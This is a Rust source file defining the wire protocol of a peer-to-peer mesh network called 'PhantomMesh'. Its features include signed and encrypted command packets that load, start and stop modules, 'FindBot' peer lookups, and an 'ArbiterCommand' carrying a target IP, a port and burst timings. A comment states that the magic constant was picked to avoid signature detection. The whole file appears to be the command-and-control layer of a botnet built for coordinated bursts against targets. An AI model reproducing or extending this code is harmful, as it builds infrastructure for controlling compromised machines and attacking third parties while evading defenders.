use serde::{Deserialize, Serialize};
use ed25519_dalek::{Signer, Verifier, Signature, SigningKey, VerifyingKey};
use serde_big_array::BigArray;

#[derive(Debug, Serialize, Deserialize, Clone)]
pub enum CommandType {
    Heartbeat = 0x03,
    LoadModule = 0x04,
    StartModule = 0x05,
    StopModule = 0x06,
}

pub type GhostPacket = PhantomPacket;

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct CommandPayload {
    pub id: String,
    pub action: String,
    pub parameters: String,
    pub reply_to: Option<String>,
    pub execute_at: i64,
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct Registration {
    pub pub_key: String,
    pub peer_address: String,
    pub signature: String,
    pub pow_nonce: u64,
    pub timestamp: i64,
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct AckPayload {
    pub command_id: String,
    pub status: String,
    pub details: String,
}

#[derive(Debug, Serialize, Deserialize, Clone, PartialEq)]
pub struct PeerInfo {
    pub peer_address: String,
    pub pub_key: String,
    pub last_seen: i64,
    pub capacity: u8,
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct GossipMsg {
    pub id: String,
    pub packet: PhantomPacket,
    pub ttl: u32,
}

/// NAT hole punching signaling protocol
#[derive(Debug, Serialize, Deserialize, Clone)]
pub enum SignalMsg {
    RequestPunch { target_peer_id: String },
    Ping { timestamp: u64 },
    Pong { timestamp: u64 },
    ArbiterCommand {
        target_ip: String,
        target_port: u16,
        fire_delay_ms: u64,
        burst_duration_ms: u64,
    },
    PunchResult { success: bool, peer_id: String },
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub enum MeshMsg {
    Register(Registration),
    GetPeers,
    Peers(Vec<PeerInfo>),
    ClientHello { ephemeral_pub: String },
    ServerHello { ephemeral_pub: String },
    Gossip(GossipMsg),
    FindBot { target_id: String },
    FoundBot { nodes: Vec<PeerInfo> },
    Ack(AckPayload),
    Signal(SignalMsg),
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct PhantomPacket {
    pub magic: u32,
    pub timestamp: u64,
    #[serde(with = "BigArray")]
    pub nonce: [u8; 12],
    pub cmd_type: CommandType,
    pub data: Vec<u8>,
    #[serde(with = "BigArray")]
    pub signature: [u8; 64],
}

// Protocol constant derived from SHA256("PhantomMesh")[0..4]
// avoids "0xDEADBEEF" signature detection.
pub const PROTOCOL_MAGIC: u32 = 0x93A1B2C4; 

impl PhantomPacket {
    pub fn new(cmd: CommandType, data: Vec<u8>, key: &SigningKey) -> Self {
        use rand::RngCore;
        let mut nonce = [0u8; 12];
        rand::thread_rng().fill_bytes(&mut nonce);
        
        let mut packet = Self {
            magic: PROTOCOL_MAGIC,
            timestamp: chrono::Utc::now().timestamp() as u64,
            nonce,
            cmd_type: cmd,
            data,
            signature: [0u8; 64],
        };
        packet.sign(key);
        packet
    }

    pub fn sign(&mut self, key: &SigningKey) {
        let msg = self.digest();
        let sig = key.sign(&msg);
        self.signature = sig.to_bytes();
    }

    pub fn verify(&self, key: &VerifyingKey) -> bool {
        if self.magic != PROTOCOL_MAGIC { return false; }
        let msg = self.digest();
        let sig_obj = Signature::from_bytes(&self.signature);
        key.verify(&msg, &sig_obj).is_ok()
    }

    fn digest(&self) -> Vec<u8> {
        let mut temp = self.clone();
        temp.signature = [0u8; 64];
        serde_json::to_vec(&temp).unwrap()
    }

    pub fn decrypt(&self, key: &[u8]) -> Option<CommandPayload> {
        use chacha20poly1305::{ChaCha20Poly1305, Key, KeyInit};
        use chacha20poly1305::aead::Aead;
        
        if key.len() != 32 { return None; }
        let cipher = ChaCha20Poly1305::new(Key::from_slice(key));
        let nonce = chacha20poly1305::Nonce::from_slice(&self.nonce);
        
        let plaintext_bytes = cipher.decrypt(nonce, self.data.as_ref()).ok()?;
        let json = String::from_utf8(plaintext_bytes).ok()?;
        serde_json::from_str::<CommandPayload>(&json).ok()
    }
}
